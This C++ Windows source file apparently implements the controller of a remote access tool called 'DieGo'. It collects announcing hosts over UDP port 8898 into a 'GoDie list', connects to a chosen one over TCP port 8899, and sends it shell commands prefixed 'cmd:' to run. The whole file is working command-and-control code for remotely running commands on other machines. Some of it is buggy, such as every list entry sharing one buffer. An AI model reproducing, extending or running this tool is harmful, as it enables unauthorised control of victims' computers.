#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <typeinfo>
#include <vector>
#include <thread>
#define BUFFER 1024

#pragma comment(lib,"WS2_32.lib")
using namespace std;

const char* CMD_EXIT="exit";
const char* CMD_CMD="cmd";

vector<char*> all;
SOCKET s,tcp;
char buf[BUFFER];
int len;
int ret;
WSADATA data;
SOCKADDR_IN sin,tcpin;
bool chosing=true;
void showAll() {
	system("cls");
	cout<<"Welcome to DieGo!\nMade By Xs.JIONG\n\nGoDie list:\n";
	for (int i=0;i<all.size();i++) cout<<(i+1)<<" - "<<all[i]<<endl;
	cout<<"Input the ip index to control:";
}
void FindIp() {
	while (chosing) {
		ret=recvfrom(s, buf, sizeof(buf), 0, (sockaddr*)&sin, &len);
		if (!chosing) return;
		if (ret>0) {
			buf[ret]='\0';
			bool find=false;
			for (int i=0;i<all.size();i++)
				if (strcmp(all[i],buf)==0) {
					find=true;
					break;
				}
			if (!find) {
				all.push_back(buf);
				showAll();
			}
		}
	}
	return;
}
bool cmding=false;
const char* CGUI="Welcome to DieGo Control GUI!\nMade By Xs.JIONG\n\n1 - Cmd\n2 - Exit\n\nChoose one:";
void ResultThread() {
	char buffer[128];
	while (cmding) {
		recv(tcp,buffer,1,0);
		cout<<buffer;
	}
}
void doOne() {
	all.clear();
	chosing=true;
	system("cls");
	system("title DieGo");
	s = socket(AF_INET,SOCK_DGRAM,0);
	bool rr=true;
	setsockopt(s, SOL_SOCKET, SO_REUSEADDR, (char*)&rr, sizeof(BOOL));
	if (s==INVALID_SOCKET) {
		cout<<"Socket created failed, ErrorCode:"<<WSAGetLastError();
		WSACleanup();
		exit(1);
	}
	len=sizeof(SOCKADDR);
	ZeroMemory(buf,BUFFER);
	sin.sin_addr.S_un.S_addr = INADDR_ANY;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(8898);
	ret = bind(s,(SOCKADDR*)&sin,sizeof(SOCKADDR));
	if (ret==SOCKET_ERROR) {
		cout<<"Socket Error"<<endl;
		exit(1); 
	}
	showAll();
	thread t(FindIp);
	t.detach();
	int i;
	cin>>i;
	while (i>all.size()) {
		showAll();
		cin>>i;
	}
	i--;
	chosing=false;
	system("cls");
	cout<<"Connecting..."<<endl;
	closesocket(s);
	tcp=socket(AF_INET,SOCK_STREAM,0);
	tcpin.sin_addr.S_un.S_addr = inet_addr(all[i]);
	tcpin.sin_family = AF_INET;
	tcpin.sin_port = htons(8899);
	connect(tcp,(SOCKADDR*)&tcpin,sizeof(SOCKADDR));
	system("cls");
	string s;
	char c;
	system(("title DieGo - "+string(all[i])).c_str());
	while (true) {
		system("cls");
		cout<<CGUI;
		cin>>i;
		while (i>2) {
			system("cls");
			cout<<CGUI;
			cin>>i;
		}
		switch (i) {
			case 1:{
				cout<<"Input Command:";
				s="";
				getchar();
				c=getchar();
				while (c!='\n') {
					s+=c;
					c=getchar();
				}
				s="cmd:"+s;
				send(tcp,s.c_str(),s.length(),0);
				break;
			}
			case 2:{
				send(tcp,CMD_EXIT,strlen(CMD_EXIT),0);
				closesocket(tcp);
				return;
			}
		}
	}
}
int main() {
	if (WSAStartup(MAKEWORD(2,2),&data)!=0) {
		cout<<"Start failed\n";
		exit(1);
	}
	while (true) doOne();
	return 0;
}
